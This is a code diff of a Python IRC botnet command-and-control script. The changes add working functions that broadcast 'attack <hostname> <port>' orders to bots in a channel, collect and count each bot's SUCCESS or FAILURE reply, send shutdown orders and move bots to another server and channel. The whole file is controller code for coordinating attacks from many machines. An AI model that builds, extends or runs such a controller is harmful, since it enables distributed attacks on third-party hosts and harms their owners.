@@ -53,21 +53,14 @@ class PyBotCon:
   def conMain(self):
     while(True):
 '''
-      data = ""
-      data = self.ircsock.recv(1024).decode("UTF-8")
-      data = data.strip("\n\r")
-      dataLen = len(data.split()) #Split on white space
-
-      if dataLen == 2 and data.split()[0] == "PING":
-        print("DEBUG --> data recieved: PING REQUEST")
-        self.ping()
-      elif dataLen >= 4 and data.split()[1] == "PRIVMSG": 
-        print("DEBUG --> PRIVMSG/data recieved: ")
-        senderDetails = data.split()[0].split(":")[1]
-        senderNick = senderDetails.split("!")[0]
-        channelOrUser = data.split()[2]   # THIS VARIABLE TELLS IF MESSAGE WAS sent publicly (#Channel), or private message (Our Nick)
-        temp = data.split("PRIVMSG")[1].split(":")
-        senderMessage = temp[1]
+      read, _, _ = select.select([self.ircsock],[],[],2)
+      if self.ircsock in read:
+        data = self.ircsock.recv(1024).decode("UTF-8")
+        data = data.strip("\n\r")
+        dataLen = len(data.split())
+        if dataLen == 2 and data.split()[0] == "PING":
+#          print("DEBUG --> data recieved: PING REQUEST")
+          self.ping()
 '''
       print("command> ",end='')
       command = input()
@@ -77,43 +70,84 @@ class PyBotCon:
       elif(command.startswith("attack")):
         atkCommand = command.split()
         self.attackOrder(atkCommand[1],atkCommand[2])
-        # NOTE --> Need to create a function for sending the attack command
-        print("Call attack function here")
       elif(command.startswith("move")):
         chanCommand = command.split()
         self.changeChannel(self.channel, chanCommand[1], chanCommand[2], chanCommand[3])
         # Need to call a move channel function for the conbot, will write later
       elif(command=="quit"):
-        # NOTE --> Might need to actually disconnect form the IRC server before exiting the program, will have to look into this
+        self.ircsock.close()
         sys.exit("Command Bot Disconnected")
       elif(command=="shutdown"):
         self.shutdownCommand()
+      else:
+        sys.exit("Invalid Command; try one of: status | attack <hostname> <port> | move <hostname> <port> <channel> | shutdown | quit")
 
   def attackOrder(self, hostname, port):
     self.ircsock.send(bytes("PRIVMSG " + self.channel + " :attack " + hostname + " " + port + "\n\r","UTF-8"))
     time.sleep(2)
     period = timedelta(seconds=5) 
     endLoop = datetime.now() + period
-'''
+    resultsList = []
     while datetime.now() < endLoop:
       read, _, _ = select.select([self.ircsock],[],[],5)
       if self.ircsock in read:
         data = self.ircsock.recv(2048).decode("UTF-8")
         data = data.strip("\n\r")
         dataLen = len(data.split())
-        if(data.split()[1]=="PRIVMSG" and data.split("PRIVMSG",1)[1].split(":",1)[1].startswith("SUCCESS")): # NOTE --> The response message that we're expecting from bots is "YOURS"
-          temp = data.split("PRIVMSG",1)[1].split(":",1)[1] # Finds name of the bot reply
-          print("DEBUG --> Bot name found:" + temp)
-          self.botList.append(temp[11:]) # Adds the name of the bot reply to botList
+        if(data.split()[1]=="PRIVMSG"):
+          temp = data.split()[0].split(":")[1].split("!")[0] # Finds name of the bot reply
+#          print("DEBUG --> Bot name found: " + temp)
+          resultsList.append([temp,data.split("PRIVMSG",1)[1].split(":",1)[1]]) # Adds the name of the bot reply to botList
         elif dataLen == 2 and data.split()[0] == "PING":
-          print("DEBUG --> data recieved: PING REQUEST")
+#          print("DEBUG --> data recieved: PING REQUEST")
           self.ping()
-'''
+    successCount = 0
+    failureCount = 0
+    unknownCount = 0
+    for result in resultsList:
+      if result[1] == "SUCCESS":
+        print(str(result[0]) + ": attack successful")
+        successCount+=1
+      elif result[1] == "FAILURE":
+        print(str(result[0]) + ": attack failed, destination host unreachable")
+        failureCount+=1
+      else:
+        print(str(result[0]) + ": unknown result")
+        unknownCount+=1
+    print("Total: "+str(successCount)+" successful, "+str(failureCount)+" unsuccessful, "+str(unknownCount)+" unknown")
+
   def ping(self):
     self.ircsock.send(bytes("PONG :pingis\n","UTF-8"))
 
   def shutdownCommand(self):
     self.ircsock.send(bytes("PRIVMSG " + self.channel + " :shutdown\n\r","UTF-8"))
+    time.sleep(2)
+    period = timedelta(seconds=5) 
+    endLoop = datetime.now() + period
+    shutdownList = []
+    while datetime.now() < endLoop:
+      read, _, _ = select.select([self.ircsock],[],[],5)
+      if self.ircsock in read:
+        data = self.ircsock.recv(2048).decode("UTF-8")
+        data = data.strip("\n\r")
+        dataLen = len(data.split())
+        if(data.split()[1]=="PRIVMSG"):
+          temp = data.split()[0].split(":")[1].split("!")[0] # Finds name of the bot reply
+#          print("DEBUG --> Bot name found: " + temp)
+          shutdownList.append([temp,data.split("PRIVMSG",1)[1].split(":",1)[1]]) # Adds the name of the bot reply to botList
+        elif dataLen == 2 and data.split()[0] == "PING":
+#          print("DEBUG --> data recieved: PING REQUEST")
+          self.ping()
+    successCount = 0
+    failureCount = 0
+    for result in shutdownList:
+      if result[1] == "DOWN":
+        print(str(result[0]) + ": shutting down")
+        successCount+=1
+      else:
+        print(str(result[0]) + ": shutdown cannot be confirmed for some reason...")
+        failureCount+=1
+    print("Total: "+str(successCount)+" bots shut down, "+str(failureCount)+" unknown")
 
   def changeChannel(self,channel,newServer, newPort, newChannel):
     self.ircsock.send(bytes("PRIVMSG " + channel + " :" + "move " + newServer + " " + newPort + " " + newChannel + "\n","UTF-8"))
